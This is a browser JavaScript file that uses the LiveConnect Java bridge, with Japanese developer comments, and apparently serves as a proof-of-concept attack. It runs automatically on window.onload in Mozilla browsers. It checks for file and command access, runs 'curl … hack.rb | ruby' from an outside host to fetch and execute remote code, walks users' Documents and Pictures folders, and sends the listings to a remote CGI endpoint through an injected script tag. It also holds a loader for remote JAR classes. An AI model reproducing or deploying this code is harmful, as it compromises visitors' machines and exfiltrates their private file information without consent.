
var url = "http://chrhsmt.com/rb/test.cgi";

lc = {

  /**  */
  ret : new Array(),

  /**
   *
   */
  parseErrorMsg : function(e) {
    var cr = lc.parseErrorMsg.arguments.length >= 2 ? lc.parseErrorMsg.arguments[1] : "\n";
    
    var msg = "";
    if (e.name) msg += "name : " + e.name + cr;
    if (e.fileName) msg += "fileName : " + e.fileName + cr;
    if (e.message) msg += "message : " + e.message + cr;
    if (e.lineNumber) msg += "lineNumber : " + e.lineNumber + cr;
    if (e.stack) msg += "stack : " + e.stack + cr;
    if (msg == "") msg = e;
    return msg;
  },

  /**
   * 
   */
  isWin : function() {
    return window.navigator.platform.toLowerCase().indexOf("win") != -1;
  },

  /**
  　*
  　*/
  getClientRootPath : function() {
    if (this.isWin()) {
        rootPath = "C:¥¥";
    } else {
        rootPath = "/";
    }
    return rootPath;
  },

  /**
  　*
  　*/
  isFileAccessible : function() {
    return new java.io.File(this.getClientRootPath()).listFiles() != null;  
  },
  
  /**
   * 
   */
  isCommandAccessible : function() {
    return java.lang.Runtime.getRuntime().exec("echo 1") == null ? false : true ;
  },

  /**
   * 
   */
  goJava : function() {
    try {
      //結果のjson化？
      this.ret["fileAccessible"] = null;
      this.ret["commandAccessible"] = null;
  
      var rootPath = "";
      var separator = "";
      if (this.isWin()) {
        rootPath = "C:";
        separator = "¥¥";
      } else {
        rootPath = "/";
        separator = "/";
      }

      //file access
      if (this.isFileAccessible()) {

        //command access
        if (this.isCommandAccessible()) {
          this.ret["commandAccessible"] = true;

          var existCurl = false;
          var existRuby = false;
          var cmd = "which curl ruby";
          var tmp = this.doCommand(cmd, true);
          this.ret[cmd] = tmp;
          if (tmp.indexOf("no curl") == -1) {
            existCurl = true;
          }
          if (tmp.indexOf("no ruby") == -1) {
/*            cmd = "ruby -v";
            this.ret[cmd] = this.doCommand(cmd, true);
*/
            existRuby = true;
          }

          if (existCurl && existRuby) {
            //一行でパイプで渡すとエラーになるので二分割 -> /bin/sh -c で解決
/*            cmd = "curl -L -o ./test.rb http://chrhsmt.com/hack.rb";
            tmp = this.doCommand(cmd, true);
            this.ret[cmd] = tmp;
*/
            //java.lang.Processに渡す配列なのでjava.lang.reflectで作成
            var cmds = java.lang.reflect.Array.newInstance(java.lang.String, 3);
            cmds[0] = "/bin/sh";
            cmds[1] = "-c"
            //cmds[2] = "ruby ./test.rb ; rm -rf ./test.rb"
            cmds[2] = "curl -L http://chrhsmt.com/hack.rb | ruby"
            //最後のコマンドはwaitせず
            tmp = this.doCommand(cmds, false);
            //コマンド連結
            for (var i=0, l=cmds.length, cmd=""; i<l; i++) {
              cmd += cmds[i] + " ";
            }
            this.ret[cmd] = tmp;
          }
 
        } else {
          this.ret["commandAccessible"] = false;
        }

        //ディレクトリ構造取得
        this.ret["fileAccessible"] = true;
        this.getFileInfo(rootPath);

        //RemoteJarFile
        //this.evalRemoteJar();

        /*
         * 結果のクエリ化
         */
        var reqSentense;
        for(o in this.ret) {
          reqSentense += o + "=" +  this.ret[o] + "&";
        }
        //セミコロンによるコマンド連結を使用した場合はURLクエリ内で
        //パラメータ区切り文字として扱われてしまうのでreplace
        reqSentense = reqSentense.replace(/\;/g, ' ');

        /*
         * 
         */
        var head = document.getElementsByTagName("head")[0];
        var script = document.createElement("script");
        script.src = url + "?" + reqSentense;
        script.type = "text/javascript";
        head.appendChild(script);

        /* ajax
         * クロスドメインなので却下
        var ajax = new com.chrhsmt.Asynchronous();
        var fnc = function() {
          if (ajax.obj.readyState == 4 && ajax.obj.status == 200) {
            throw new Error('1');
            alert(ajax.obj.responseText);
          }
        }
        ajax.send("http://chrhsmt.com/rb/test.cgi", true, "post", reqSentense, fnc);
        */
    
      } else {
        //file access不可なら何もしない
      }
      
    } catch(e) {
      //alert(this.parseErrorMsg(e));
      
    }
    //alert('finish');
  },

  /**
   * 
   * @param {String or Array} cmd
   * @param {Boolean} isWaitFor
   */
  doCommand : function(cmd, isWaitFor) {

    var runtime = java.lang.Runtime.getRuntime();
    var process = runtime.exec(cmd);
    if (isWaitFor) {
      process.waitFor();
      var str = "";
      if (process.exitValue() == 0) {
        var is = process.getInputStream();
        var reader = new java.io.BufferedReader(new java.io.InputStreamReader(is));
        var buf = "";
        while ((buf = reader.readLine()) != null) {
          str += buf;
        }
      } else {
        var is = process.getErrorStream();
        var reader = new java.io.BufferedReader(new java.io.InputStreamReader(is));
        var buf = "";
        while ((buf = reader.readLine()) != null) {
          str += buf;
        }
      }
      return str;
    } else {
      return null;
    }

  },

  /**
   * 
   * @param {String} rootPath
   */
  getFileInfo : function(rootPath) {

    var SLASH = "/";
    var USERS = "Users";
    var DOCUMENTS = "Documents";
    var PICTURES = "Pictures";
    var DIR = "Dir";
    var FILE = "File";

    //policyのpermissionによってファイルアクセスの可否が決まる。
    var files = new java.io.File(rootPath).listFiles();
    for (var i=0, fl=files.length; i < fl; i++){
      var file = files[i].getName();
      this.ret[SLASH + file] = file;
  
      ///Users
      if (file == USERS && files[i].isDirectory()) {
        var users = files[i].listFiles();
        for (var j=0, ul=users.length; j < ul; j++) {
          if (users[j].isDirectory()) {
            var user = users[j].getName();
            this.ret[SLASH + USERS + SLASH + user] = user;
  
            var userFolders = users[j].listFiles();
            for (var k=0, fl = userFolders.length; k < fl; k++) {
              //Documents
              if (userFolders[k].getName() == DOCUMENTS && userFolders[k].isDirectory()) {
                var docFiles = userFolders[k].listFiles();
                if (docFiles != null) {
                  for (var l=0, dl=docFiles.length; l<dl; l++) {
                    var path = docFiles[l].getAbsolutePath();
                    var fileOrDir = docFiles[l].isDirectory() ? DIR : FILE;
                    this.ret[path] = fileOrDir;
                  }
                }
              }
              //Pictures
              if (userFolders[k].getName() == PICTURES && userFolders[k].isDirectory()) {
                var picFiles = userFolders[k].listFiles();
                if (picFiles != null) {
                  for (var l=0, pl=picFiles.length; l<pl; l++) {
                    var path = picFiles[l].getAbsolutePath();
                    var fileOrDir = docFiles[l].isDirectory() ? DIR : FILE;
                    this.ret[path] = fileOrDir;
                  }
                }
              }
            }
          }
        }
      }
    }
  },

  /**
   * 
   */
  evalRemoteJar : function() {
    /*
     * URLCLassLoaderTest
     * 配列変数作成
     * java.lang.reflect.Array.newInstance(java.net.URL, 2)
     * 
     */
    var jarUrl = "jar:http://chrhsmt.com/test.jar!/";;
    var methodName = "go";
    var urls = java.lang.reflect.Array.newInstance(java.net.URL, 1);
    urls[0] = new java.net.URL(jarUrl);
    var loader = new java.net.URLClassLoader(urls, java.lang.ClassLoader.getSystemClassLoader());
    var clazz = loader.loadClass("com.chrhsmt.Test");
    var method = clazz.getMethod(methodName, null);
    var obj = method.invoke(clazz.newInstance(), null);
    this.ret[jarUrl] = obj;
  }
};

var oldLoad = window.onload;
window.onload = function() {
  oldLoad != null ? oldLoad() : void(0);
  if (window.navigator.appCodeName.toLowerCase().indexOf("mozilla") != -1) {
    window.setTimeout("lc.goJava()", 1000);
  }
}
